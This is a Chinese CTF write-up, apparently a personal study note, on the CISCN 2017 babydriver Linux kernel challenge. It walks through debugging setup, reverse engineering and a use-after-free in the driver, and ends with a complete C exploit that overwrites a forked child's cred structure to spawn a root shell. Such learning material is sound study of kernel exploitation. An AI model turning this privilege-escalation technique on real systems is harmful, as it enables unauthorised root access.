---
title: 关于 kernel-UAF 的学习总结
top: 43
tags:
  - kernel-UAF
  - kernel
categories:
  - 学习总结
abbrlink: 406ce0e2
---

终于来到了关于内核的学习，目前打算浅尝一下内核的基础知识和漏洞。之后每个学习的新漏洞都单独写一篇文章，每篇学到的新的前置知识都放到对应的文章中吧，暂时先不做汇总。

### CISCN2017_Pwn_babydriver

#### 前置知识

将 `rootfs.cpio` 文件系统映像解包，因为静态分析需要解包得到的 `ko` 文件

```
hen rootfs.cpio
```



解包脚本 `hen`

```bash
#!/bin/bash
mv $1 $1.gz
unar $1.gz
mv $1 core
mv $1.gz $1
echo "[+]Successful"
```



打包脚本 `gen`

```bash
#!/bin/sh
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > $1 
mv $1 ..
```



使用下面的命令，从 `bzImage` 文件中提取 `vmlinux`

```
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux
```



##### 调试

```
sudo gdb vmlinux
```



下面的命令导入符号表，这个 `ko` 文件是刚刚解压 `rootfs.cpio` 得到的，后面这个 `0xffffffffc0000000` 需要在启动内核后，输入 `lsmod` 查看驱动的基地址从而得到。

```
add-symbol-file /home/zikh/Desktop/babydriver/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000
```



最后用下面的命令连接，调试程序

```
target remote localhost:1234
```

![image-20230326160909064](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261609913.png)

设置断点需要用驱动的基地址加上 `ida` 中的偏移的位置打断点即可，这个基地址仅仅是和 `text` 段的地址相同，假设你现在想查看 `bss` 段上的某个变量，那么需要获取到 `bss` 段的基地址以及变量在 `bss` 段上的偏移。

假设要查看 `0xd90` 这个地址装载到内存中的实际地址。首先获取它在 `bss` 段上的偏移，发现 `bss` 段基地址为 `0xd00` 因此这个地址在 `bss` 段上偏移为 `0x90` 

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270841264.png" alt="image-20230327084110128" style="zoom: 50%;" />



获取 `bss` 段的基地址 （如下）

![image-20230327084300554](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270843604.png)

因此 `babydevice_t` 结构体地址是 `0xffffffffc00024d0` ，验证如下

![image-20230327085333674](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270853716.png)



##### 内核提权

如果攻击者能够修改某个进程中的 `cred` 结构体中的 `gid` 和 `uid` `euid`等字段为 `0`，也就是能控制 `cred` 结构体的话，那么攻击者就获得了 `root` 权限，如果再开启一个 `shell` 的话，执行的任何命令也都是拥有 `root` 权限



##### 题目链接

https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar

解压文件

```shell
tar -xvf babydriver.tar
```



`boot.sh` 文件

因为我的虚拟机不支持 `kvm` ，所以把原本 `-enable-kvm` 这段代码删了，为了方便之后使用 `gdb` 进行调试，加上了 `-gdb tcp::1234` 这段代码

```sh
#!/bin/bash
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1'  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234
```

然后运行 `boot.sh` 启动即可。



##### 逆向分析

###### babyopen

![image-20230326151320208](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261513281.png)

申请了 `0x40` 的堆空间，并返回申请的内存首地址记录在 `babydevice_t` 结构体的 `device_buf` 字段

将 `0x40` 赋值为 `babydevice_t` 结构体的 `device_buf` 字段。需要注意的是 `babydevice_t` 结构体位于 `bss` 段上，这个全局变量就会存在被覆盖的可能，也就是说我连续 `open` 两次，那么第二次申请出来的内存块地址则会覆盖第一次申请的内存块地址。



###### babyioctl

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262003083.png" alt="image-20230326200309961" style="zoom: 80%;" />

该函数定义了一个 `0x10001` 的命令，先将 `babydevice_t` 结构体中的 `device_buf` 给释放掉，然后重新申请了一块内存，因为 `v3` 是 `rdx` 寄存器所赋值的，也就是 `babyioctl` 函数的第三个参数，而 `v3` 又给了 `v4` ，这个内存大小是我们可控的。



###### babyread

![image-20230326201609836](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262016891.png)

该函数显示检查了 `device_buf` 是否为空，如果为空的话返回 `-1` ，如果 `device_buf_len` 大于 `write` 函数的第三个参数则将 `device_buf` 中的数据 `copy` 到用户区 `buffer` 空间中

这里 `ida` 生成的伪代码是有点问题的，正常情况是 `copy_to_user(buffer, babydev_struct.device_buf, v4);`

###### babywrite

![image-20230326204108774](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262041836.png)

这个函数和 `babywrite` 是相反的，将数据从用户区的 `buffer` 复制到内核中的 `device_buf` 。



###### babyrelease

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262101441.png" alt="image-20230326210113392" style="zoom: 80%;" />

该函数可以将 `device_buf` 这个堆块给释放掉，但是释放内存后，未将指针置空，产生了 `UAF` 漏洞。



#### 利用思路

连续 `open` 两次，分配出 `fd1` 和 `fd2` ，此时 `fd2` 将 `fd1` 的堆块地址覆盖掉了。再使用 `ioctl` 函数去执行那个 `0x10001` 的指令，将 `fd1` 释放掉 （其实释放的是 `fd2` ），再申请一个 `0xa8` 的堆块出来（用于伪造 `cred` 结构体 ），接着再用 `release` （也就是 `close` ） 函数将 `fd1` 释放掉（此时释放的是刚刚申请出来 `0xa8 `的那个堆块）

调用 `fork` 函数，创建一个子进程出来，并让父进程 `wait`。子进程产生时，就需要申请一个 `0xa8` 的堆块用来当做 `cred` 结构体，这时就会申请出来刚刚的我们释放掉的堆块。因为最后 `release` 是对 `fd1` 操作的，此时 `fd2` 是依然可以被写入数据的，向 `fd2` 中写入数据就等同于向子进程刚刚申请 `cred` 结构体中写入数据。此时父进程中 `device_buf` 记录的就是刚刚子进程申请堆块的地址。

将其 `cred` 结构体前 `0x28` 个字节覆盖成 `\x00` 执行 `system("/bin/sh")` 即可开启一个 `root` 权限下的 `shell` ，也就完成了所谓的内核提权。

上述思路的重点在于，`release` 操作对一个文件使用后，就无法再用 `write` 等函数进行该文件的操作了。但 `fd1` 和 `fd2` 其实都同时指向了`device_buf` （无论 `device_buf` 是哪个堆块地址）。因此用 `release` 函数释放 `fd1` 将申请的 `0xa8` 堆块给 `free` 掉，通过 `write` 函数对 `fd2` 操作依然可以写入数据。



#### EXP

```c
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
int main()
{
	int fd1=open("/dev/babydev",O_RDWR);
	int fd2=open("/dev/babydev",O_RDWR);
	printf("fd1 ---> %d\n",fd1);
	printf("fd2 ---> %d\n",fd2);
	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	int id;
	char cred[0xa8]={0};
	id=fork();
	if(id<0)
	{
		printf("fork error!\n");
	}
	if(id>0)
	{
		wait(NULL);
	}
	if(id==0)
        {
		write(fd2,cred,0x28);
		if(getuid()==0)
		{
			printf("root user!\n");
			system("/bin/sh");
			return 0;
		}
        }
	printf("emmmm!\n");
	close(fd2);
	return 0;
}
```



![image-20230326234748211](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262347791.png)



### 参考文章

[kernel UAF - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/)

[(47条消息) kernel pwn -- UAF_钞sir的博客-CSDN博客](https://blog.csdn.net/qq_40827990/article/details/97272034?spm=1001.2014.3001.5502)
